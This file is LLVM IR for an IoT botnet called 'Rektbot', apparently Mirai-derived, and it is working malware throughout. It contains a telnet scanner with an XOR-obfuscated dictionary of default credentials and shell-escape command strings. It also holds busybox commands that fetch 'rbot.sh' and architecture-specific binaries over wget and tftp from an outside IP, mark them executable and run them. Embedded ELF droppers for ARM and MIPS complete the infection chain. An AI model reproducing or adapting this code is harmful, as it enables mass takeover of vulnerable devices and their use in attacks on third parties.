; ModuleID = 'host/ir_bcf/Rektbot.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.payload = type { i8, i8, i8*, i16 }
%struct.scanner_auth = type { i8*, i8*, i16, i16, i8, i8 }
%struct.__sigset_t = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%union.__SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.scanner_connection = type { %struct.scanner_auth*, %struct.telnet_info, i32, i32, i32, i32, i32, [8192 x i8], [16 x i8], i8, i8, i8, i8, i16, i16, i32, i32 }
%struct.telnet_info = type { i32, i32 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.binary = type { i8*, i8 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.resolv_entries = type opaque

@fd_ctrl = global i32 -1, align 4
@fd_serv = global i32 -1, align 4
@pending_connection = global i8 0, align 1
@pid1 = common global i32 0, align 4
@pid2 = common global i32 0, align 4
@maintain_thread = common global i32 0, align 4
@LOCAL_ADDR = common global i32 0, align 4
@scanner_pid = common global i32 0, align 4
@spid = common global i32 0, align 4
@mainpid = common global i32 0, align 4
@srv_addr = common global %struct.sockaddr_in zeroinitializer, align 4
@.str = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.1 = private unnamed_addr constant [8 x i8] c"unknown\00", align 1
@.str.2 = private unnamed_addr constant [13 x i8] c"/bin/busybox\00", align 1
@.str.3 = private unnamed_addr constant [5 x i8] c"\00\00\00\01\00", align 1
@ensure_single_instance.local_bind = internal global i8 1, align 1
@fake_time = global i32 0, align 4
@rsck = common global i32 0, align 4
@scanner_rawpkt = global [40 x i8] zeroinitializer, align 16
@.str.20 = private unnamed_addr constant [5 x i8] c"PMMV\00", align 1
@.str.21 = private unnamed_addr constant [6 x i8] c"VVLGV\00", align 1
@.str.22 = private unnamed_addr constant [9 x i8] c"\13\12\12\13AJKL\00", align 1
@.str.23 = private unnamed_addr constant [6 x i8] c"KTFGT\00", align 1
@.str.24 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.25 = private unnamed_addr constant [4 x i8] c"@KL\00", align 1
@.str.26 = private unnamed_addr constant [8 x i8] c"FGDCWNV\00", align 1
@.str.27 = private unnamed_addr constant [7 x i8] c"FCGOML\00", align 1
@.str.28 = private unnamed_addr constant [7 x i8] c"AOQ\17\12\12\00", align 1
@.str.29 = private unnamed_addr constant [8 x i8] c"pmmv\17\12\12\00", align 1
@.str.30 = private unnamed_addr constant [5 x i8] c"pmmv\00", align 1
@.str.31 = private unnamed_addr constant [8 x i8] c"VQNKLWZ\00", align 1
@.str.32 = private unnamed_addr constant [9 x i8] c"XQWL\13\13\1A\1A\00", align 1
@.str.33 = private unnamed_addr constant [10 x i8] c"rNQaJEoG\13\00", align 1
@.str.34 = private unnamed_addr constant [8 x i8] c"WREPCFG\00", align 1
@.str.35 = private unnamed_addr constant [6 x i8] c"VGNAM\00", align 1
@.str.36 = private unnamed_addr constant [5 x i8] c"\13\13\13\13\00", align 1
@.str.37 = private unnamed_addr constant [5 x i8] c"\16\11\10\13\00", align 1
@.str.38 = private unnamed_addr constant [6 x i8] c"WKF\1F\12\00", align 1
@.str.39 = private unnamed_addr constant [5 x i8] c"WKF\12\00", align 1
@.str.40 = private unnamed_addr constant [7 x i8] c"Q[QVGO\00", align 1
@.str.41 = private unnamed_addr constant [11 x i8] c"VGNLGVPMMV\00", align 1
@.str.42 = private unnamed_addr constant [13 x i8] c"PMMVRCQQUMPF\00", align 1
@.str.43 = private unnamed_addr constant [9 x i8] c"PMMVRCQQ\00", align 1
@.str.44 = private unnamed_addr constant [11 x i8] c"VGNLGVRCQQ\00", align 1
@.str.45 = private unnamed_addr constant [15 x i8] c"VGNLGVRCQQUMPF\00", align 1
@.str.46 = private unnamed_addr constant [9 x i8] c"RCQQUMPF\00", align 1
@.str.47 = private unnamed_addr constant [5 x i8] c"RCQQ\00", align 1
@.str.48 = private unnamed_addr constant [6 x i8] c"QJGNN\00", align 1
@.str.49 = private unnamed_addr constant [14 x i8] c"VCxXb\10\11\16\1B\17\1A\17\1B\00", align 1
@.str.50 = private unnamed_addr constant [10 x i8] c"VQEMKLEML\00", align 1
@.str.51 = private unnamed_addr constant [10 x i8] c"QWRGPWQGP\00", align 1
@.str.52 = private unnamed_addr constant [11 x i8] c"NKLWZQJGNN\00", align 1
@.str.53 = private unnamed_addr constant [15 x i8] c"V\12VCNA\12LVP\12N\16\03\00", align 1
@.str.54 = private unnamed_addr constant [6 x i8] c"EWGQV\00", align 1
@.str.55 = private unnamed_addr constant [7 x i8] c"\13\10\11\16\17\14\00", align 1
@.str.56 = private unnamed_addr constant [6 x i8] c"\13\10\11\16\17\00", align 1
@.str.57 = private unnamed_addr constant [5 x i8] c"WQGP\00", align 1
@.str.58 = private unnamed_addr constant [6 x i8] c"CFOKL\00", align 1
@.str.59 = private unnamed_addr constant [7 x i8] c"FGTKAG\00", align 1
@.str.60 = private unnamed_addr constant [5 x i8] c"\13\10\11\16\00", align 1
@.str.61 = private unnamed_addr constant [11 x i8] c"\13\10\11\16\17\14\15\1A\1B\12\00", align 1
@.str.62 = private unnamed_addr constant [7 x i8] c"\13\13\13\13\13\13\00", align 1
@.str.63 = private unnamed_addr constant [5 x i8] c"\13\1B\1A\1A\00", align 1
@.str.64 = private unnamed_addr constant [6 x i8] c"\10\10\10\10\10\00", align 1
@.str.65 = private unnamed_addr constant [14 x i8] c"cFOKLKQVPCVMP\00", align 1
@.str.66 = private unnamed_addr constant [14 x i8] c"CFOKLKQVPCVMP\00", align 1
@.str.67 = private unnamed_addr constant [6 x i8] c"cFOKL\00", align 1
@.str.68 = private unnamed_addr constant [4 x i8] c"CFO\00", align 1
@.str.69 = private unnamed_addr constant [13 x i8] c"\15WHoIM\12CFOKL\00", align 1
@.str.70 = private unnamed_addr constant [9 x i8] c"QOACFOKL\00", align 1
@.str.71 = private unnamed_addr constant [10 x i8] c"CFOKL\13\10\11\16\00", align 1
@.str.72 = private unnamed_addr constant [9 x i8] c"CFOKL\13\10\11\00", align 1
@.str.73 = private unnamed_addr constant [7 x i8] c"C@A\13\10\11\00", align 1
@.str.74 = private unnamed_addr constant [9 x i8] c"ACV\13\12\10\1B\22\00", align 1
@.str.75 = private unnamed_addr constant [4 x i8] c"\17WR\00", align 1
@.str.76 = private unnamed_addr constant [6 x i8] c"\03PMMV\00", align 1
@.str.77 = private unnamed_addr constant [2 x i8] c"\13\00", align 1
@.str.78 = private unnamed_addr constant [3 x i8] c"\13\10\00", align 1
@.str.79 = private unnamed_addr constant [7 x i8] c"CLVQNS\00", align 1
@.str.80 = private unnamed_addr constant [9 x i8] c"\13\10\11\16\17\14\15\1A\00", align 1
@.str.81 = private unnamed_addr constant [7 x i8] c"\12\12\12\12\12\12\00", align 1
@.str.82 = private unnamed_addr constant [9 x i8] c"\12\12\12\12\12\12\12\12\00", align 1
@.str.83 = private unnamed_addr constant [9 x i8] c"\13\10\11\16SUGP\00", align 1
@.str.84 = private unnamed_addr constant [9 x i8] c"CLLK\10\12\13\11\00", align 1
@.str.85 = private unnamed_addr constant [6 x i8] c"\17\16\11\10\13\00", align 1
@.str.86 = private unnamed_addr constant [7 x i8] c"XNZZ\0C\22\00", align 1
@.str.87 = private unnamed_addr constant [6 x i8] c"HT@XF\00", align 1
@.str.88 = private unnamed_addr constant [5 x i8] c"CLIM\00", align 1
@.str.89 = private unnamed_addr constant [8 x i8] c"ZOJFKRA\00", align 1
@.str.90 = private unnamed_addr constant [7 x i8] c"ZA\11\17\13\13\00", align 1
@.str.91 = private unnamed_addr constant [6 x i8] c"TKXZT\00", align 1
@.str.92 = private unnamed_addr constant [8 x i8] c"CLVQNS\22\00", align 1
@.str.93 = private unnamed_addr constant [9 x i8] c"HWCLVGAJ\00", align 1
@.str.94 = private unnamed_addr constant [8 x i8] c"eo\1A\13\1A\10\22\00", align 1
@.str.95 = private unnamed_addr constant [7 x i8] c"\1A\1A\1A\1A\1A\1A\00", align 1
@.str.96 = private unnamed_addr constant [7 x i8] c"\14\14\14\14\14\14\00", align 1
@.str.97 = private unnamed_addr constant [9 x i8] c"JWLV\17\15\17\1B\00", align 1
@.str.98 = private unnamed_addr constant [11 x i8] c"QWRGPTKQMP\00", align 1
@.str.99 = private unnamed_addr constant [9 x i8] c"X[CF\13\10\11\16\00", align 1
@.str.100 = private unnamed_addr constant [7 x i8] c"OE\11\17\12\12\00", align 1
@.str.101 = private unnamed_addr constant [7 x i8] c"OGPNKL\00", align 1
@.str.102 = private unnamed_addr constant [8 x i8] c"QWRRMPV\00", align 1
@.str.103 = private unnamed_addr constant [7 x i8] c"VGNLGV\00", align 1
@.str.104 = private unnamed_addr constant [9 x i8] c"MRGPCVMP\00", align 1
@.str.105 = private unnamed_addr constant [37 x i8] c"enable\0D\0Asystem\0D\0Ashell\0D\0Ash\0D\0Aping ; sh\00", align 1
@.str.106 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.107 = private unnamed_addr constant [141 x i8] c"/bin/busybox cat /bin/busybox || while read i; do /bin/busybox echo $i; done < /bin/busybox || /bin/busybox dd if=/bin/busybox bs=22 count=1\00", align 1
@.str.108 = private unnamed_addr constant [4 x i8] c"arm\00", align 1
@.str.109 = private unnamed_addr constant [5 x i8] c"arm4\00", align 1
@.str.110 = private unnamed_addr constant [142 x i8] c"/bin/busybox cat /proc/cpuinfo || while read i; do /bin/busybox echo $i; done < /proc/cpuinfo || /bin/busybox dd if=/proc/cpuinfo count=1; %s\00", align 1
@tmp_dirs = global [15 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1.5, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2.6, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.3.7, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.4.8, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14, i32 0, i32 0)], align 16
@.str.111 = private unnamed_addr constant [18 x i8] c">%s.file && cd %s\00", align 1
@.str.112 = private unnamed_addr constant [32 x i8] c"/bin/busybox rm -rf .file %s %s\00", align 1
@.str.113 = private unnamed_addr constant [13 x i8] c".rbot.binary\00", align 1
@.str.114 = private unnamed_addr constant [14 x i8] c".rbot.dropper\00", align 1
@.str.115 = private unnamed_addr constant [98 x i8] c"/bin/busybox cp /bin/busybox .rbot.binary; >.rbot.binary; /bin/busybox chmod 777 .rbot.binary; %s\00", align 1
@.str.116 = private unnamed_addr constant [8 x i8] c"unknown\00", align 1
@.str.117 = private unnamed_addr constant [142 x i8] c"/bin/busybox wget http://%d.%d.%d.%d/rbot.sh -O- >.rbot.shell; /bin/busybox tftp -g -l .rbot.shell -r rbot.sh %d.%d.%d.%d; sh .rbot.shell; %s\00", align 1
@.str.118 = private unnamed_addr constant [41 x i8] c"/bin/busybox wget; /bin/busybox tftp; %s\00", align 1
@.str.119 = private unnamed_addr constant [101 x i8] c"/bin/busybox cp /bin/busybox .rbot.dropper; >.rbot.dropper; /bin/busybox chmod 777 .rbot.dropper; %s\00", align 1
@.str.120 = private unnamed_addr constant [125 x i8] c"/bin/busybox wget http://%d.%d.%d.%d/rbot.%s -O- >.rbot.binary; /bin/busybox chmod 777 .rbot.binary;./.rbot.binarys wget; %s\00", align 1
@.str.121 = private unnamed_addr constant [121 x i8] c"/bin/busybox tftp -g -l .rbot.binary -r rbot.%s %d.%d.%d.%d; /bin/busybox chmod 777 .rbot.binary;./.rbot.binary tftp; %s\00", align 1
@.str.123 = private unnamed_addr constant [2 x i8] c">\00", align 1
@.str.124 = private unnamed_addr constant [3 x i8] c">>\00", align 1
@.str.125 = private unnamed_addr constant [36 x i8] c"./.rbot.dropper;./.rbot.binary echo\00", align 1
@.str.126 = private unnamed_addr constant [24 x i8] c"chmod 777 .rbot.dropper\00", align 1
@.str.122 = private unnamed_addr constant [50 x i8] c"/bin/busybox echo -en '%s' %s .rbot.dropper;%s;%s\00", align 1
@.str.150 = private unnamed_addr constant [21 x i8] c"ead-only file system\00", align 1
@.str.151 = private unnamed_addr constant [17 x i8] c"ermission denied\00", align 1
@.str.130 = private unnamed_addr constant [7 x i8] c"\5Cx%02x\00", align 1
@payloads = global [4 x %struct.payload] [%struct.payload { i8 1, i8 40, i8* getelementptr inbounds ([1081 x i8], [1081 x i8]* @.str.16, i32 0, i32 0), i16 1080 }, %struct.payload { i8 1, i8 41, i8* getelementptr inbounds ([1337 x i8], [1337 x i8]* @.str.17, i32 0, i32 0), i16 1336 }, %struct.payload { i8 2, i8 8, i8* getelementptr inbounds ([1889 x i8], [1889 x i8]* @.str.18, i32 0, i32 0), i16 1888 }, %struct.payload { i8 1, i8 8, i8* getelementptr inbounds ([1921 x i8], [1921 x i8]* @.str.19, i32 0, i32 0), i16 1920 }], align 16
@.str.16 = private unnamed_addr constant [1081 x i8] c"\7FELF\01\01\01a\00\00\00\00\00\00\00\00\02\00(\00\01\00\00\00\DC\82\00\004\00\00\00p\03\00\00\02\02\00\004\00 \00\02\00(\00\05\00\04\00\01\00\00\00\00\00\00\00\00\80\00\00\00\80\00\00P\03\00\00P\03\00\00\05\00\00\00\00\80\00\00\01\00\00\00P\03\00\00P\03\01\00P\03\01\00\00\00\00\00\08\00\00\00\06\00\00\00\00\80\00\00\01\18\A0\E1\FF\18\01\E2\00\1C\81\E1\FF0\03\E2\02$\A0\E1\03\10\81\E1\FF,\02\E2\01 \82\E1\FF<\02\E2\FF\08\02\E2\034\A0\E1 \04\A0\E1\22\0C\80\E1\02<\83\E1\00\00\83\E1\0E\F0\A0\E1\00\10\A0\E1\00\00\9F\E5\87\00\00\EA\01\00\90\00\00\10\A0\E1\00\00\9F\E5\83\00\00\EA\06\00\90\00\01\C0\A0\E1\00\10\A0\E1\08\00\9F\E5\020\A0\E1\0C \A0\E1|\00\00\EA\05\00\90\00\04\E0-\E5\0C\D0M\E2\07\00\8D\E8\03\10\A0\E3\0D \A0\E1\08\00\9F\E5t\00\00\EB\0C\D0\8D\E2\00\80\BD\E8f\00\90\00\01\C0\A0\E1\00\10\A0\E1\08\00\9F\E5\020\A0\E1\0C \A0\E1k\00\00\EA\04\00\90\00\01\C0\A0\E1\00\10\A0\E1\08\00\9F\E5\020\A0\E1\0C \A0\E1d\00\00\EA\03\00\90\00\04\E0-\E5\0C\D0M\E2\07\00\8D\E8\01\10\A0\E3\0D \A0\E1\08\00\9F\E5\5C\00\00\EB\0C\D0\8D\E2\00\80\BD\E8f\00\90\00\F0A-\E9@\E1\9F\E5\94\D0M\E2\00\00\00\EA\01\E0\8E\E2\00`\DE\E5\00\00V\E3\FB\FF\FF\1A$\C1\9F\E5\D00\A0\E3\0E\80l\E0\02@\A0\E3P\C0\A0\E3k\10\A0\E3\85 \A0\E3\B0\00\A0\E3\83\C0\CD\E5\80@\CD\E5\81`\CD\E5\82`\CD\E5\A9\FF\FF\EB\F4\10\9F\E5\84\00\8D\E5\F0 \9F\E5\F0\00\9F\E5\BC\FF\FF\EB\01\10\A0\E3\00p\A0\E1\06 \A0\E1\04\00\A0\E1\D6\FF\FF\EB\01\00p\E3\01\00w\13\00P\A0\E1\01\00\A0\03\AA\FF\FF\0B\05\00\A0\E1\80\10\8D\E2\10 \A0\E3\B5\FF\FF\EB\00\00P\E3\00\00`\B2\A3\FF\FF\BB\17@\88\E2\05\00\A0\E1\A0\10\9F\E5\04 \A0\E1\B7\FF\FF\EB\04\00P\E1\03\00\A0\13\9B\FF\FF\1B\06@\A0\E1\93\10\8D\E2\01 \A0\E3\05\00\A0\E1\B6\FF\FF\EB\01\00P\E3\04\00\A0\E3\93\FF\FF\1B\930\DD\E5\04D\83\E1d0\9F\E5\03\00T\E1\F3\FF\FF\1A\0D\10\A0\E1\80 \A0\E3\05\00\A0\E1\AA\FF\FF\EB\00 P\E2\0D@\A0\E1\0D\10\A0\E1\07\00\A0\E1\01\00\00\DA\9D\FF\FF\EB\F4\FF\FF\EA\05\00\A0\E1\85\FF\FF\EB\07\00\A0\E1\83\FF\FF\EB\05\00\A0\E3}\FF\FF\EB\94\D0\8D\E2\F0\81\BD\E8\1C\83\00\00A\02\00\00\FF\01\00\00$\83\00\004\83\00\00\0A\0D\0A\0D\A5\FF\FF\EAp@-\E9\10@\8D\E2p\00\94\E8q\00\90\EF\01\0Ap\E3\00@\A0\E1p\80\BD\98\03\00\00\EB\000d\E2\000\80\E5\00\00\E0\E3p\80\BD\E8\00\00\9F\E5\0E\F0\A0\E1P\03\01\00arm4\00\00\00\00.rbot.binary\00\00\00\00GET /rbot.arm4 HTTP/1.0\0D\0A\0D\0A\00\00.shstrtab\00.text\00.rodata\00.bss\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0B\00\00\00\01\00\00\00\06\00\00\00t\80\00\00t\00\00\00\A8\02\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\11\00\00\00\01\00\00\002\00\00\00\1C\83\00\00\1C\03\00\004\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\01\00\00\00\19\00\00\00\08\00\00\00\03\00\00\00P\03\01\00P\03\00\00\08\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\01\00\00\00\03\00\00\00\00\00\00\00\00\00\00\00P\03\00\00\1E\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\00", align 1
@.str.17 = private unnamed_addr constant [1337 x i8] c"\7FELF\01\01\01\00\00\00\00\00\00\00\00\00\02\00(\00\01\00\00\00l\83\00\004\00\00\00H\04\00\00\02\00\00\044\00 \00\04\00(\00\06\00\05\00\01\00\00\00\00\00\00\00\00\80\00\00\00\80\00\00\14\04\00\00\14\04\00\00\05\00\00\00\00\80\00\00\01\00\00\00\14\04\00\00\14\04\01\00\14\04\01\00\10\00\00\00\10\00\00\00\06\00\00\00\00\80\00\00\07\00\00\00\14\04\00\00\14\04\01\00\14\04\01\00\00\00\00\00\08\00\00\00\04\00\00\00\04\00\00\00Q\E5td\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\07\00\00\00\04\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\018\83\E1\00<\83\E1\024\83\E1\03\0C\A0\E1\02\08\80\E1\FF(\03\E2\22\04\80\E1#\0C\80\E1\1E\FF/\E1\04\E0-\E5\00\10\A0\E1\04\D0M\E2\01\00\A0\E3\9D\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\04\E0-\E5\00\10\A0\E1\04\D0M\E2\06\00\A0\E3\95\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\04\E0-\E5\01\C0\A0\E1\020\A0\E1\00\10\A0\E1\04\D0M\E2\0C \A0\E1\05\00\A0\E3\8A\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\04\E0-\E5\01\C0\A0\E1\020\A0\E1\00\10\A0\E1\04\D0M\E2\0C \A0\E1\0C\00\9F\E5\7F\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\1B\01\00\00\04\E0-\E5\01\C0\A0\E1\020\A0\E1\00\10\A0\E1\04\D0M\E2\0C \A0\E1\04\00\A0\E3s\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\04\E0-\E5\01\C0\A0\E1\020\A0\E1\00\10\A0\E1\04\D0M\E2\0C \A0\E1\03\00\A0\E3h\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\04\E0-\E5\01\C0\A0\E1\020\A0\E1\00\10\A0\E1\04\D0M\E2\0C \A0\E1\0C\00\9F\E5]\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\19\01\00\00\F0A-\E9@1\9F\E5\98\D0M\E2\00@\A0\E3\00\00\00\EA\01@\84\E2\01`S\E5\00\00V\E3\010\83\E2\FA\FF\FF\1A\02\C0\A0\E3\D00\A0\E3k\10\A0\E3\85 \A0\E3\B4\C8\CD\E1\B0\00\A0\E3\05\CA\A0\E3\B6\C8\CD\E1\9A\FF\FF\EB\FC\10\9F\E5\88\00\8D\E5\F8 \9F\E5\F8\00\9F\E5\AE\FF\FF\EB\01\10\A0\E3\00p\A0\E1\06 \A0\E1\02\00\A0\E3\D6\FF\FF\EB\01\00p\E3\01\00w\13\00P\A0\E1\01\00\A0\03\94\FF\FF\0B\05\00\A0\E1\84\10\8D\E2\10 \A0\E3\AB\FF\FF\EB\00\00P\E3\00\00`\B2\8D\FF\FF\BB\17@\84\E2\05\00\A0\E1\A8\10\9F\E5\04 \A0\E1\AF\FF\FF\EB\04\00P\E1\03\00\A0\13\85\FF\FF\1B\94\80\9F\E5\06@\A0\E1\97`\8D\E2\06\10\A0\E1\01 \A0\E3\05\00\A0\E1\B0\FF\FF\EB\01\00P\E3\04\00\A0\E3{\FF\FF\1B\970\DD\E5\04D\83\E1\08\00T\E1\F4\FF\FF\1A\04@\8D\E2\04\10\A0\E1\80 \A0\E3\05\00\A0\E1\A4\FF\FF\EB\00 P\E2\04\10\A0\E1\07\00\A0\E1\01\00\00\DA\94\FF\FF\EB\F5\FF\FF\EA\05\00\A0\E1r\FF\FF\EB\07\00\A0\E1p\FF\FF\EB\05\00\A0\E3f\FF\FF\EB\98\D0\8D\E2\F0A\BD\E8\1E\FF/\E1\E1\83\00\00A\02\00\00\FF\01\00\00\E8\83\00\00\F8\83\00\00\0A\0D\0A\0D\A5\FF\FF\EA\0D\C0\A0\E1\F0\00-\E9\00p\A0\E1\01\00\A0\E1\02\10\A0\E1\03 \A0\E1x\00\9C\E8\00\00\00\EF\F0\00\BD\E8\01\0Ap\E3\0E\F0\A01\FF\FF\FF\EA\04\E0-\E5\1C \9F\E5\000\A0\E1\02 \9F\E7\06\00\00\EB\000c\E2\020\80\E7\00\00\E0\E3\04\E0\9D\E4\1E\FF/\E1l\80\00\00\00\00\00\00\0F\0A\E0\E3\1F\F0@\E2\00\00\A0\E1\00\00\A0\E1arm7\00\00\00\00.rbot.binary\00\00\00\00GET /rbot.arm7 HTTP/1.0\0D\0A\0D\0A\00\00\00\00\00\00\00\00\00\00\00\00\00\08\00\00\00\00.shstrtab\00.text\00.rodata\00.tbss\00.got\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0B\00\00\00\01\00\00\00\06\00\00\00\C0\80\00\00\C0\00\00\00 \03\00\00\00\00\00\00\00\00\00\00\10\00\00\00\00\00\00\00\11\00\00\00\01\00\00\002\00\00\00\E0\83\00\00\E0\03\00\004\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\01\00\00\00\19\00\00\00\08\00\00\00\03\04\00\00\14\04\01\00\14\04\00\00\08\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\1F\00\00\00\01\00\00\00\03\00\00\00\14\04\01\00\14\04\00\00\10\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\04\00\00\00\01\00\00\00\03\00\00\00\00\00\00\00\00\00\00\00$\04\00\00$\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\00", align 1
@.str.18 = private unnamed_addr constant [1889 x i8] c"\7FELF\01\02\01\00\00\00\00\00\00\00\00\00\00\02\00\08\00\00\00\01\00@\04`\00\00\004\00\00\06H\00\00\10\07\004\00 \00\03\00(\00\07\00\06\00\00\00\01\00\00\00\00\00@\00\00\00@\00\00\00\00\05\B4\00\00\05\B4\00\00\00\05\00\01\00\00\00\00\00\01\00\00\05\C0\00D\05\C0\00D\05\C0\00\00\00T\00\00\00p\00\00\00\06\00\01\00\00dt\E5Q\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\07\00\00\00\04\00\00\00\00\00\00\00\00\00\00\00\000\A5\00\FF\00\05,\00\00\04&\00\00\85 %0\C2\00\FF0\E7\00\FF\00\87 %\00\02\12\00\03\E0\00\08\00D\10%<\1C\00\05'\9C\84\E8\03\99\E0!\8F\99\80\5C\00\80(!\03 \00\08$\04\0F\A1<\1C\00\05'\9C\84\CC\03\99\E0!\8F\99\80\5C\00\80(!\03 \00\08$\04\0F\A6<\1C\00\05'\9C\84\B0\03\99\E0!\00\A0\10!\8F\99\80\5C\00\C08!\00\80(!\00@0!\03 \00\08$\04\0F\A5<\1C\00\05'\9C\84\88\03\99\E0!'\BD\FF\D0\AF\BF\00(\AF\BC\00\10\8F\99\80\5C\AF\A4\00\18\AF\A5\00\1C\AF\A6\00 $\04\10\06'\A6\00\18\03 \F8\09$\05\00\03\8F\BC\00\10\8F\BF\00(\00\00\00\00\03\E0\00\08'\BD\000<\1C\00\05'\9C\84<\03\99\E0!\00\A0\10!\8F\99\80\5C\00\C08!\00\80(!\00@0!\03 \00\08$\04\0F\A4<\1C\00\05'\9C\84\14\03\99\E0!\00\A0\10!\8F\99\80\5C\00\C08!\00\80(!\00@0!\03 \00\08$\04\0F\A3<\1C\00\05'\9C\83\EC\03\99\E0!'\BD\FF\D0\AF\BF\00(\AF\BC\00\10\8F\99\80\5C\AF\A4\00\18\AF\A5\00\1C\AF\A6\00 $\04\10\06'\A6\00\18\03 \F8\09$\05\00\01\8F\BC\00\10\8F\BF\00(\00\00\00\00\03\E0\00\08'\BD\000<\1C\00\05'\9C\83\A0\03\99\E0!'\BD\FF@\AF\BF\00\BC\AF\B2\00\B8\AF\B1\00\B4\AF\B0\00\B0\AF\BC\00\10\8F\82\80\18\00\00\00\00$P\05\80\82\02\00\00\00\00\00\00\14@\FF\FD&\10\00\01&\10\FF\FF$\02\00\02\A7\A2\00\1C$\02\00P\A7\A2\00\1E\8F\82\80\18\8F\99\80L$\07\00\D0$\04\00\B0$\05\00k$\06\00\85$B\05\80\03 \F8\09\02\02\80#\8F\BC\00\10$\05\03\01\8F\84\80\18\8F\99\80`$\84\05\88$\06\01\FF\03 \F8\09\AF\A2\00 \8F\BC\00\10$\04\00\02\8F\99\80P$\05\00\02\00\000!\03 \F8\09\00@\90!\00@\88!$\02\FF\FF\8F\BC\00\10\12\22\00\03\00\00\00\00\16B\00\07\00\00\00\00\8F\99\80T\00\00\00\00\03 \F8\09$\04\00\01\8F\BC\00\10\00\00\00\00\8F\99\80D\02  !'\A5\00\1C\03 \F8\09$\06\00\10\8F\BC\00\10\04A\00\07\00\00\00\00\8F\99\80T\00\00\00\00\03 \F8\09\00\02 #\8F\BC\00\10\00\00\00\00\8F\85\80\18\8F\99\80H&\10\00\17$\A5\05\98\02  !\03 \F8\09\02\000!\8F\BC\00\10\10P\00\07\00\00\80!\8F\99\80T\00\00\00\00\03 \F8\09$\04\00\03\8F\BC\00\10\00\00\80!\8F\99\808\02  !'\A5\00\18\03 \F8\09$\06\00\01\8F\BC\00\10$\03\00\01\8F\99\80T\10C\00\04$\04\00\04\03 \F8\09\00\00\00\00\8F\BC\00\10\83\A3\00\18\00\10\12\00\00C\80%<\02\0D\0A4B\0D\0A\16\02\FF\ED\00\00\00\00\8F\99\808'\B0\00,\02  !\02\00(!\03 \F8\09$\06\00\80\8F\BC\00\10\02\00(!\8F\99\80H\00@0!\18@\00\06\02@ !\03 \F8\09\00\00\00\00\8F\BC\00\10\10\00\FF\F0\00\00\00\00\8F\99\80X\00\00\00\00\03 \F8\09\02  !\8F\BC\00\10\00\00\00\00\8F\99\80X\00\00\00\00\03 \F8\09\02@ !\8F\BC\00\10\00\00\00\00\8F\99\80T\00\00\00\00\03 \F8\09$\04\00\05\8F\BC\00\10\8F\BF\00\BC\8F\B2\00\B8\8F\B1\00\B4\8F\B0\00\B0\03\E0\00\08'\BD\00\C0<\1C\00\05'\9C\81P\03\99\E0!\03\E0\00!\04\11\00\01\00\00\00\00<\1C\00\05'\9C\818\03\9F\E0!\00\00\F8!\8F\99\80<\00\00\00\00\03 \00\08\00\00\00\00\00\00\00\00\00\00\00\00<\1C\00\05'\9C\81\10\03\99\E0!\00\80\10!\00\A0 !\00\C0(!\00\E00!\8F\A7\00\10\8F\A8\00\14\8F\A9\00\18\8F\AA\00\1C'\BD\FF\E0\AF\A8\00\10\AF\A9\00\14\AF\AA\00\18\AF\A2\00\1C\8F\A2\00\1C\00\00\00\0C\14\E0\00\03'\BD\00 \03\E0\00\08\00\00\00\00\00@ 